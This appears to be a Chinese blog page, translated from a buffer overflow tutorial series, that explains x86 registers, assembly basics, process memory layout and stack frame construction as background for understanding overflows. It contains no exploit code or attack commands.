        <h1 id="BUFFER-OVERFLOW"><a href="#BUFFER-OVERFLOW" class="headerlink" title="BUFFER OVERFLOW"></a>BUFFER OVERFLOW</h1><h2 id="The-Basic-of-x86-Architecture"><a href="#The-Basic-of-x86-Architecture" class="headerlink" title="The Basic of x86 Architecture"></a>The Basic of x86 Architecture</h2><table>
<thead>
<tr>
<th align="left">寄存器名</th>
<th align="left">大小</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">AL,AH&#x2F;AX&#x2F;EAX</td>
<td align="left">8，8&#x2F;16&#x2F;32</td>
<td>用于算术计算的主寄存器。 也称为累加器，因为它保存算术运算的结果和函数返回值。</td>
</tr>
<tr>
<td align="left">BL,BH&#x2F;BX&#x2F;EBX</td>
<td align="left">8,8&#x2F;16&#x2F;32</td>
<td>基址寄存器。 指向 DS 段中数据的指针。 用于存储程序的基地址</td>
</tr>
<tr>
<td align="left">CL,DH&#x2F;CX&#x2F;ECX</td>
<td align="left">8,8&#x2F;16&#x2F;32</td>
<td>计数器寄存器通常用于保存一个值，该值表示一个过程要重复的次数。 用于循环和字符串操作。</td>
</tr>
<tr>
<td align="left">DL,DH&#x2F;DX&#x2F;EDX</td>
<td align="left">8,8&#x2F;16&#x2F;32</td>
<td>通用寄存器。 也用于 I&#x2F;O 操作。 帮助将 EAX 扩展到 64 位</td>
</tr>
<tr>
<td align="left">SI&#x2F;ESI</td>
<td align="left">16&#x2F;32</td>
<td>源索引寄存器。 指向 DS 寄存器指向的段中的数据的指针。 在字符串和数组操作中用作偏移地址。 它保存读取数据的地址。</td>
</tr>
<tr>
<td align="left">DI&#x2F;EDI</td>
<td align="left">16&#x2F;32</td>
<td>目标索引寄存器。 指向 ES 寄存器指向的段中的数据（或目标）的指针。 在字符串和数组操作中用作偏移地址。 它保存所有字符串操作的隐含写地址。</td>
</tr>
<tr>
<td align="left">BP&#x2F;EBP</td>
<td align="left">16&#x2F;32</td>
<td>基指针。 指向堆栈上数据的指针（在 SS 段中）。 它指向当前堆栈帧的底部。 它用于引用局部变量。</td>
</tr>
<tr>
<td align="left">SP&#x2F;ESP</td>
<td align="left">16&#x2F;32</td>
<td>堆栈指针（在 SS 段中）。 它指向当前堆栈帧的顶部。 它用于引用局部变量。</td>
</tr>
</tbody></table>
<p>​													表1:X86 处理器和使用</p>
<h1 id="THE-SEGMENT-REGISTERS"><a href="#THE-SEGMENT-REGISTERS" class="headerlink" title="THE SEGMENT REGISTERS"></a>THE SEGMENT REGISTERS</h1><p>六个段寄存器保存了16位的段选择器。一个段选择器是一个在内存中定义了一个段的特殊的指针。为了在内存中访问一个特别的段，这个段的段选择器必须存在于合适的段寄存器中。四个段寄存器CS,DS,ES和SS和在 intel 8086 和 intel 286 处理器中的段寄存器一样，同时 FS 和 GS 在 intel 32位架构中被引入。</p>
<p>段寄存器如何被使用取决于操作系统正在使用的内存管理模式。当使用 flat (unsegmented) 内存模式，段寄存器会随着指向部分重叠段的段选择器而被加载，每一个起始地址为 0 地址的线地址空间如图6所示。这些部分重叠的段之后会组成程序的线性地址空间。有两个特殊的部分重叠的段被定义：一个是 code 另一个是 data and stacks。CS 段寄存器指向了 code 段，剩下的所有段寄存器指向了 data and stack 段。</p>
<table>
<thead>
<tr>
<th>段寄存器</th>
<th>大小(bits)</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td>CS</td>
<td>16</td>
<td>程序段寄存器。代码段的基地址(.text section).常用来获取指令</td>
</tr>
<tr>
<td>DS</td>
<td>16</td>
<td>数据寄存器。变量的默认地址(.data section).常用来数据获取。</td>
</tr>
<tr>
<td>ES</td>
<td>16</td>
<td>额外的段寄存器。在字符串操作过程中使用</td>
</tr>
<tr>
<td>SS</td>
<td>16</td>
<td>栈段的寄存器。栈段的基地址。当隐式的使用SP或ESP或显式</td>
</tr>
<tr>
<td>FS</td>
<td>16</td>
<td>额外的段寄存器</td>
</tr>
<tr>
<td>GS</td>
<td>16</td>
<td>额外的段寄存器</td>
</tr>
<tr>
<td></td>
<td></td>
<td>表2:X86段寄存器和它们的用处</td>
</tr>
</tbody></table>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1_files/image009.png" alt="The use of segment registers for flat memory model"></p>
<p>​											图6:FLAT内存模式的段寄存器示例</p>
<h1 id="INSTRUCTION-POINTER-REGISTER-EIP"><a href="#INSTRUCTION-POINTER-REGISTER-EIP" class="headerlink" title="INSTRUCTION POINTER REGISTER - EIP"></a>INSTRUCTION POINTER REGISTER - EIP</h1><p>EIP 寄存器包含了当前代码段和下一条将要被执行的指令之间的偏移。默认在执行一系列指令例如 JMP,JCC,CALL,RET and IRET 等在代码线性的或者前移或者后移的代码中从一条指令边界到相邻的指令。</p>
<p>EIP 不能直接的被软件访问。它被控制传输指令例如 JMP,JCC,CALL,RET 和 IRET隐形的控制。唯一的读取 EIP 寄存器值的方法是执行 CALL 指令之后读取指令指针从函数栈的返回值。原因是因为当 CALL 指令被执行，调用后的相邻的地址会立刻跟在 CALL 之后，作为函数返回地址被保存在站上。之后，EIP 可以通过修改在栈上的返回指令指针的值被间接的加载，并且执行返回 RET&#x2F;IRET 指令。</p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>大小(bits)</th>
<th>用处</th>
</tr>
</thead>
<tbody><tr>
<td>IP&#x2F;EIP</td>
<td>16&#x2F;32</td>
<td>指令指针保存了下一条将要被执行的指令的地址</td>
</tr>
</tbody></table>
<h1 id="THE-ASSEMBLY-LANGUAGE"><a href="#THE-ASSEMBLY-LANGUAGE" class="headerlink" title="THE ASSEMBLY LANGUAGE"></a>THE ASSEMBLY LANGUAGE</h1><p>为了理解缓冲区溢出的操作，一些汇编的知识非常必要。</p>
<table>
<thead>
<tr>
<th>语言</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>机器语言</td>
<td>是计算机真正看到的处理的。计算机看到的每一条命令是一个活着一串给定的数字。是二进制数据或者为了易读转换为16进制</td>
<td>83 ec 08 -&gt; sub $0x8,%esp</td>
</tr>
<tr>
<td>汇编语言</td>
<td>和机器语言一样，除了命令编号已被更易读且更易于记忆的字母序列所取代</td>
<td>push ebp</td>
</tr>
</tbody></table>
<p>​																表1:语言分类</p>
<p>汇编直接处理处理器和内存位置的寄存器.下面列出了一些通常适用于大多数汇编语言的一般规则:</p>
<ul>
<li>资源可以是内存，寄存器和常量</li>
<li>目标可以是内存或者非分段寄存器</li>
<li>只有源和目标之一可以是内存</li>
<li>源和目标必须是同样大小</li>
</ul>
<p>操作码是程序运行时的真正指令。每一个操作码对应一行代码，其中包含了操作码和操作码所需的操作数。操作数的数量变化取决于操作码。整个可用的操作码集合对一个处理器来说被称为一个指令集。根据处理器和使用的反汇编器不同，操作码可能会有相反的顺序。例如在 windows 上：</p>
<p><code>MOV dst, src</code></p>
<p>作用和 linux 上如下代码一致</p>
<p><code>MOV %src, %dst</code></p>
<p>Windows 使用的是 intel 汇编格式而 linux 使用的是 AT&amp;T，MAC OS 使用的是 Motorola 处理器指令集。High Level Assembly(HLA) 同样在一些程序中非常受欢迎。</p>
<table>
<thead>
<tr>
<th><strong>Instruction Category</strong></th>
<th><strong>Meaning</strong></th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Data Transfer</td>
<td>move from source to destination</td>
<td>mov, lea, les, push, pop, pushf, popf</td>
</tr>
<tr>
<td>Arithmetic(计算)</td>
<td>arithmetic on integers</td>
<td>add, adc, sub, sbb, mul, imul, div, idiv, cmp, neg, inc, dec, xadd,cmpxchg</td>
</tr>
<tr>
<td>Floating point</td>
<td>arithmetic on floating point</td>
<td>fadd, fsub, fmul, div, cmp</td>
</tr>
<tr>
<td>Logical, Shift, Rotate and Bit(逻辑，移位，旋转和为)</td>
<td>bitwise logic operations</td>
<td>and, or, xor, not, shl&#x2F;sal, shr, sar, shld and shrd, ror, rol, rcr and rcl</td>
</tr>
<tr>
<td>Control transfer</td>
<td>conditional and unconditional jumps, procedure calls</td>
<td>jmp, jcc, call, ret, int, into, bound.</td>
</tr>
<tr>
<td>String</td>
<td>move, compare, input and output</td>
<td>movs, lods, stos, scas, cmps, outs, rep, repz, repe, repnz, repne, ins</td>
</tr>
<tr>
<td>I&#x2F;O</td>
<td>For input and output</td>
<td>in, out</td>
</tr>
<tr>
<td>Conversion</td>
<td>Provide assembly data types conversion</td>
<td>movzx, movsx, cbw, cwd, cwde, cdq, bswap, xlat</td>
</tr>
<tr>
<td>Miscellaneous(其他的)</td>
<td>manipulate individual flags, provide special processor services, or handle privileged mode operations(或者处理特权模式操作)</td>
<td>clc, stc, cmc, cld, std, cl, sti</td>
</tr>
</tbody></table>
<p>​														表2:汇编指令集集合</p>
<h1 id="进程加载"><a href="#进程加载" class="headerlink" title="进程加载"></a>进程加载</h1><p>​		在 Linux 中，从文件系统（使用execve() 或spawn() 系统调用）加载的进程采用ELF 格式。如果文件系统位于面向块的设备上，则代码和数据将加载到主内存中。如果文件系统是内存映射的（例如 ROM&#x2F;Flash 映像），则无需将代码加载到 RAM 中，而是可以就地执行。这种方法使所有 RAM 都可用于数据和堆栈，而将代码留在 ROM 或闪存中。在所有情况下，如果同一个进程被多次加载，其代码将被共享。在我们运行可执行文件之前，首先我们必须将它加载到内存中。这是由<strong>loader</strong>完成的，它通常是操作系统的一部分。加载器做以下事情：</p>
<ul>
<li><p>内存和访问验证：</p>
<p>首先，OS 系统内核读入程序文件的头信息，并对类型、访问权限和权限、内存要求及其运行指令的能力进行验证。它确认文件是一个可执行映像并计算内存需求。</p>
</li>
<li><p>流程设置，包括：</p>
<ol>
<li>为程序的执行分配主存</li>
<li>将地址空间从辅存复制到主存。</li>
<li>将.text 和.data 部分从可执行文件复制到主存中。</li>
<li>将程序参数（例如，命令行参数）复制到堆栈中。</li>
<li>初始化寄存器：将 esp设置为指向栈顶，清除其余部分。</li>
<li>跳转到启动例程，它：从堆栈中复制 <code>main()</code>的参数，并跳转到<code>main()</code></li>
</ol>
</li>
</ul>
<p>​        地址空间是包含程序代码、堆栈和数据段的内存空间，换言之，是程序运行时使用的所有数据。内存布局通常由三段（文本、数据和堆栈）组成，简化形式如图 4 所示。动态数据段也称为<strong>堆</strong>，是动态分配内存的地方（例如来自malloc( ) 和new) 。动态分配的内存是在<strong>运行时而</strong> 不是<strong>编译</strong>&#x2F;<strong>链接时</strong>分配的内存 . 这种组织允许在堆（显式）和栈（隐式）之间对动态分配的内存进行任何划分。这就解释了为什么栈向下增长而堆向上增长。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1_files/image021.png" alt="C 进程的内存布局"></p>
<p>​													图4:进程的内存布局</p>
<h1 id="运行时数据结构"><a href="#运行时数据结构" class="headerlink" title="运行时数据结构"></a>运行时数据结构</h1><p>进程是一个正在运行的程序。这意味着操作系统已将程序的可执行文件加载到内存中，已安排它访问其命令行参数和环境变量，并已启动它运行。从概念上讲，一个进程有五个不同的内存区域分配给它，如表 1 中所列（参见图 4）</p>
<table>
<thead>
<tr>
<th><strong>区域</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Code&#x2F;text segment</td>
<td>通常称为文本段，这是可执行指令所在的区域。例如，Linux&#x2F;Unix 会安排一些事情，以便同一程序的多个运行实例在可能的情况下共享它们的代码。<strong>任何时候都只有一个相同程序的指令副本驻留在内存中</strong>。包含文本段的可执行文件部分是文本段。</td>
</tr>
<tr>
<td>Initialized data – data segment</td>
<td>使用非零值初始化的静态分配和全局数据位于数据段中。<strong>运行相同程序的每个进程都有自己的数据段</strong>。包含数据段的可执行文件部分是数据段。</td>
</tr>
<tr>
<td>Uninitialized data – bss segment</td>
<td>BSS 代表“<strong>由符号开始</strong>的<strong>块</strong>”。 默认情况下初始化为零的全局和静态分配的数据保存在进程的所谓 BSS 区域中。<strong>每个运行相同程序的进程都有自己的 BSS 区域</strong>。运行时将BSS数据放在数据段中。在可执行文件中，它们存储在 BSS 部分。对于 Linux&#x2F;Unix 可执行文件的格式，只有初始化为非零值的变量才会占用可执行文件磁盘文件中的空间。</td>
</tr>
<tr>
<td>Heap</td>
<td>堆是动态内存（由malloc() 、 calloc() 、realloc() 和new – C++ 获得）的来源。堆上的所有内容都是<strong>匿名的</strong>，因此您只能通过指针访问其中的一部分。随着在堆上分配内存，进程的地址空间会增长。尽管可以将内存返还给系统并缩小进程的地址空间，但这几乎从未做过，因为它将再次分配给其他进程。  释放的内存（ free()和 delete ）回到堆，创建所谓的<strong>holes</strong>。  <strong>堆是典型的向上生长</strong>。这意味着添加到堆中的连续项被添加到数字大于前项的地址处。堆 在数据段的BSS区域 之后立即开始也是典型的 。 堆的末尾由一个称为<strong>break</strong>的指针标记。您不能参考休息时间。但是，您可以将中断指针（通过 brk() 和 sbrk() 系统调用）移动到新位置以增加可用的堆内存量。</td>
</tr>
<tr>
<td>Stack</td>
<td>堆栈段是分配局部（自动）变量的地方 。在 C 程序中，局部变量是在函数体的左大括号内声明的所有变量，包括 main() 或其他未定义为静态的左大括号。数据在后进<strong>先出后</strong>出或压入堆栈 (LIFO) 规则。堆栈保存局部变量、临时信息&#x2F;数据、函数参数、返回地址等。当一个函数被调用时，一个栈帧（或一个过程激活记录）被创建并被推送到栈顶。该堆栈帧包含诸如调用函数的地址以及函数完成时跳转回的位置（返回地址）、参数、局部变量以及被调用函数所需的任何其他信息等信息。信息的顺序可能因系统和编译器而异。当一个函数返回时，堆栈帧从堆栈POPped。通常堆栈向下增长，这意味着调用链中更深的项目位于数字较低的地址并朝向堆。</td>
</tr>
</tbody></table>
<p>​																表1:可执行映像的区域</p>
<p>​		当程序运行时，初始化的数据、BSS 和堆区通常放置在称为数据段的单个连续区域中。如图 4 所示，堆栈段和代码&#x2F;文本段与数据段分开并且彼此分开。</p>
<p>​		尽管理论上堆栈和堆可以相互增长，但操作系统会阻止这种情况发生。不同sections&#x2F;segments之间的关系总结在表2中，可执行程序段和它们的位置。</p>
<table>
<thead>
<tr>
<th><strong>Executable file section</strong>(disk file)</th>
<th><strong>Address space segment</strong></th>
<th><strong>Program memory segment</strong></th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>Text</td>
<td>Code</td>
</tr>
<tr>
<td>.data</td>
<td>Data</td>
<td>Initialized data</td>
</tr>
<tr>
<td>.bss</td>
<td>Data</td>
<td>BSS</td>
</tr>
<tr>
<td>-</td>
<td>Data</td>
<td>Heap</td>
</tr>
<tr>
<td>-</td>
<td>Stack</td>
<td>Stack</td>
</tr>
</tbody></table>
<p>​												Table 2: Sections vs segments.</p>
<h1 id="过程-PROCESS"><a href="#过程-PROCESS" class="headerlink" title="过程 PROCESS"></a>过程 PROCESS</h1><p>​		下图显示了典型 C 进程的内存布局。进程在进程的基地址加载段（对应于图中的“文本”和“数据”）。主堆栈位于正下方并向下生长。创建的任何其他线程都有自己的堆栈，位于主堆栈下方。每个堆栈帧都由一个保护页分隔，以检测堆栈帧之间的堆栈溢出。堆位于进程上方并向上生长。</p>
<p>​		在进程地址空间的中间，有一个区域是为共享对象保留的。创建新进程时，进程管理器首先将可执行文件中的两个段映射到内存中。然后它解码程序的 ELF 头。如果程序头指示可执行文件链接到共享库，进程管理器将从程序头中提取动态解释器的名称。动态解释器指向一个包含运行时链接器代码的共享库。进程管理器将在内存中加载这个共享库，然后将控制传递给这个库中的运行时链接器代码。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow1_files/image022.png" alt="C 在 x86 上的进程内存布局示意图"></p>
<p>​										图5:X86上 C 的进程内存布局示意图</p>
<h1 id="THE-C-FUNCTIONS"><a href="#THE-C-FUNCTIONS" class="headerlink" title="THE C FUNCTIONS"></a><strong>THE C FUNCTIONS</strong></h1><p>​		希望我们已经有一个大致的了解对于程序是如何编译、链接和组装，然后作为程序运行的进程映像加载到内存中。在我们进一步研究堆栈之前，如果我们能够了解函数是非常有用的，因为在调用函数时会构造堆栈。 在高级语言历史中，为构建程序（结构化或过程化编程）而引入的最重要的技术之一是过程或函数。程序员使用函数将他们的程序分解成具有特定任务的较小程序段，这些程序段可以独立开发、测试和重用。其他可以互换使用的术语是例程（如汇编中所称）、过程和方法（如面向对象编程中所称）。</p>
<p>​		当函数调用发生时，它会像汇编语言中的跳转 ( JMP ) 一样改变控制流，但与跳转不同的是，当完成其任务时，函数将控制权返回给紧跟在调用 ( CALL )之后的语句或指令指令，即调用函数（caller）。当我们从内存的角度来看时，这个函数的高级抽象是在<strong>堆栈</strong>的帮助下实现的。堆栈是分配给函数运行的一部分内存。当堆栈的内容包含函数运行所需的所有数据设置好时，通常使用术语<strong>堆栈帧</strong>。堆栈帧由函数内使用的所有堆栈变量组成，包括参数、局部变量、返回地址和完成函数任务所需的其他数据。当一个函数返回到调用程序时，堆栈将被拆除（由调用者或被调用者），新的函数调用将创建一个新的堆栈。通常，函数的组件如下表所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">global_variables;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  function_name(argument <span class="built_in">list</span>);</span><br><span class="line">  function_return_address here</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return_type <span class="title function_">function_name</span><span class="params">(parameter <span class="built_in">list</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  local_variables;</span><br><span class="line">  <span class="type">static</span> variables;</span><br><span class="line">  function’s code here</span><br><span class="line">  <span class="keyword">return</span> something_or_nothing;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​		请记住，main()也是一个函数，但具有执行点。下表列出了对上述功能组件的一些描述。</p>
<table>
<thead>
<tr>
<th><strong>成分</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>function name</td>
<td>函数名是一个符号，它实际上代表了函数代码开始的地址。在汇编语言中，符号是通过在函数代码之前键入函数名称作为标签来定义的。</td>
</tr>
<tr>
<td>function paramenters</td>
<td>函数的参数是显式提供给函数进行处理的数据项。有些函数有很多参数，有些没有，有些函数有可变数量的参数。</td>
</tr>
<tr>
<td>Local varuables</td>
<td>局部变量是函数在处理时使用的数据存储，在它返回时被丢弃。程序中的任何其他函数都无法访问函数的局部变量。</td>
</tr>
<tr>
<td>static variables</td>
<td>静态变量是函数在处理时使用的数据存储，之后不会被丢弃，而是在每次激活函数代码时重复使用。程序的任何其他部分都无法访问此数据。</td>
</tr>
<tr>
<td>Global variables</td>
<td>全局变量是函数用于处理的数据存储，在函数外部进行管理。程序中的任何其他函数都可以访问函数的全局变量。</td>
</tr>
<tr>
<td>return address</td>
<td>返回地址是函数必须返回的内存地址，以便继续执行下一个程序。</td>
</tr>
<tr>
<td>Return value</td>
<td>返回值是将数据传输回主程序（或调用程序）的主要方法。大多数编程语言只允许一个函数有一个返回值。</td>
</tr>
</tbody></table>
<p>​														表1:函数使用中的术语</p>
<p>​		在一个进程地址空间和物理地址映射中的函数调用过程中的堆栈使用情况可以通过下图进行说明：</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image001.png" alt="Stack in process address space and  physical address mapping"></p>
<p>​												图1:进程地址空间中的堆栈</p>
<h1 id="处理器的堆栈内存"><a href="#处理器的堆栈内存" class="headerlink" title="处理器的堆栈内存"></a>处理器的堆栈内存</h1><p>​		希望前面的部分已经为您提供了大致的了解。现在我们将把讨论范围缩小到一个堆栈。要完全了解缓冲区溢出的环境是如何发生的，必须完全了解堆栈的布局和操作。如前所述，堆栈段包含一个堆栈、一个入口&#x2F;出口、LIFO 结构。在 x86 架构上，堆栈向下增长，这意味着较新的数据将分配在地址少于之前推送到堆栈上的元素的地址处。当EBP指向的边界位于栈底，ESP指向的边界位于栈顶时，该栈通常称为栈帧（或java中的过程激活记录）。每个函数调用都会创建一个新的堆栈帧并“向下堆叠”到前一个堆栈上，每个函数都会跟踪调用链或序列，即调用它的例程以及完成后返回的位置（图 3）。使用一个非常简单的 C 程序框架，下面试图找出函数调用和堆栈帧的构造&#x2F;销毁。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">b</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">c</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">b</span>();</span><br><span class="line">  <span class="built_in">c</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">b</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">c</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">a</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​		通过只分析栈区域，下面的过程展示了上面的程序在运行的时发生了什么。在程序的终点应该是栈平衡的。</p>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image003.png" alt="Stack: Stack frame and function call, construction and destruction"></p>
<p>​													图3:栈帧和程序调用</p>
<p>​		通过参考前面的程序示例和图 3，当程序开始在函数<code>main() 中</code>执行时，将创建堆栈帧，并在堆栈上为<code>main() 中</code>声明的所有变量分配空间。然后，当<code>main()</code>调用函数 <code>a() 时</code>，会为<code>main()</code>堆栈顶部的 <code>a()</code>中的变量创建新的堆栈帧。<code>main()</code>传递给 <code>a() 的</code>任何参数都存储在堆栈中。如果 <code>a()</code>要调用任何其他函数，例如<code>b()</code>和<code>c()</code>，新的堆栈帧将分配在新的堆栈顶部。请注意，执行的顺序是按顺序发生的。当 <code>c(),b()</code>和<code>a()</code>返回，它们的局部变量的存储被取消分配，堆栈帧被销毁，堆栈顶部返回到先前的状态。执行顺序正好相反。可以看出，栈区分配的内存在程序执行过程中被使用和重用。应该清楚的是，在该区域分配的内存将包含以前使用留下的垃圾值。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/21/BO2-X86%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/" data-id="cl6x1oiit00006mgq6xv3g3v2" data-title="X86架构基础" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-BO6-函数栈" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/09/21/BO6-%E5%87%BD%E6%95%B0%E6%A0%88/" class="article-date">
  <time class="dt-published" datetime="2021-09-20T16:00:00.000Z" itemprop="datePublished">2021-09-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/09/21/BO6-%E5%87%BD%E6%95%B0%E6%A0%88/">函数栈</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="BUFFER-OVERFLOW-6-The-Function-Stack"><a href="#BUFFER-OVERFLOW-6-The-Function-Stack" class="headerlink" title="BUFFER OVERFLOW 6-The Function Stack"></a>BUFFER OVERFLOW 6-The Function Stack</h1><h2 id="THE-PROCESSOR’S-STACK-FRAME-LAYOUT"><a href="#THE-PROCESSOR’S-STACK-FRAME-LAYOUT" class="headerlink" title="THE PROCESSOR’S STACK FRAME LAYOUT"></a>THE PROCESSOR’S STACK FRAME LAYOUT</h2><p><a target="_blank" rel="noopener" href="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html">处理器的栈帧布局</a> 文章的简单翻译</p>
<p>一个典型的栈帧布局如下所示，在不同的操作系统中它可能会有不同的组织方式：</p>
<p>![栈结构](&#x2F;Users&#x2F;brian&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210917173403227.png)</p>
<p>​									图1:一个函数调用的典型栈布局结构</p>
<ul>
<li><p>函数参数</p>
</li>
<li><p>函数的返回地址</p>
</li>
<li><p>栈帧指针</p>
</li>
<li><p>错误处理框架</p>
</li>
<li><p>本地声明的变量</p>
</li>
<li><p>缓冲区</p>
</li>
<li><p>callee save registers</p>
</li>
</ul>
<p>​        从图中我们可以看出，如果出现了缓冲区溢出漏洞，它就有可能覆盖其他被分配在内存地址高于 Buffer 的变量，比如本地变量、错误处理框架、EBP、返回地址和函数参数。</p>
<p>​		以 windows\intel 为例，当函数调用发生，数据元素会按照以下的方式存储在栈中：</p>
<ol>
<li>在函数被调用之前，函数参数按照从右往左的顺序被 push 入栈中</li>
<li>函数返回地址通过 x86 的 CALL 指令被放在栈上，其值是 EIP 寄存器当前值</li>
<li>代表了 EBP 寄存器先前的值的帧指针被放在栈中</li>
<li>如果函数包括了 try&#x2F;catch 或者其他的错误处理结构，编译器会在栈中含有这些框架信息</li>
<li>接下来，是声明的本地变量</li>
<li>之后 BUFFER 为临时变量存储分配空间</li>
<li>最后，the callee save registers 例如 ESI，EDI 和 EBX 如果在函数执行阶段被任何指针使用了就会被存储。对于 Linux&#x2F;intel 这一步会在第 4 步之后发生。</li>
</ol>
<h2 id="THE-PROCESSOR’S-STACK-OPERATION"><a href="#THE-PROCESSOR’S-STACK-OPERATION" class="headerlink" title="THE PROCESSOR’S STACK OPERATION"></a>THE PROCESSOR’S STACK OPERATION</h2><p>​		有两个 CPU 寄存器对栈的功能性很重要，它们保存调用驻留在内存中的数据时所需的信息。在 32 位系统中被称为 ESP and EBP。</p>
<p>​		ESP(Extend Stack Pointer) 保存了栈顶地址。ESP 可以被直接或间接的修改：</p>
<p><strong>直接</strong>： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0Ch</span><br></pre></td></tr></table></figure>

<p>​		这条指令会使当前栈缩小 12 bytes(注意图1的栈结构，add 指令使得 ESP 往高地址增加，因此栈变小)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub esp, 0Ch</span><br></pre></td></tr></table></figure>

<p>​		这条指令会使的当前栈增长 12 bytes(实际上，ESP 的值越大，栈越小，反之亦然)</p>
<p><strong>间接</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push  ebp    ; Save ebp, put it on the stack</span><br><span class="line">pop		ebp    ; Restore ebp, remove it from the stack</span><br></pre></td></tr></table></figure>

<p>​		间接方式就是通过向栈中通过 PUSH 增加数据元素或者通过 POP 移除数据元素。</p>
<p>​		除了堆栈指针，它指向堆栈的顶部（较低的数字地址）以外； 拥有一个堆栈帧指针 (FP) 通常很方便，它保存指向帧内固定位置的地址。查看栈帧发现，我们可以通过提供局部变量与 ESP 的偏移量(offests)来引用它们。</p>
<p>​		但是，随着数据入栈和出栈，这些偏移量会发生变化，造成局部变量的引用不一致。因此，许多编译器使用另一个寄存器(通常称为帧指针 FP)，用于引用局部变量和参数，因为参数与 FP 的距离不会随 PUSH(递减ESP指针) 和 POP(递增ESP指针) 改变。</p>
<p>​		在 Intel CPUs 中，EBP 充当了 FP 这个角色。由于栈的增长方式，实参有对于 EBP 的正偏移，本地变量有对于 EBP 的负偏移。</p>
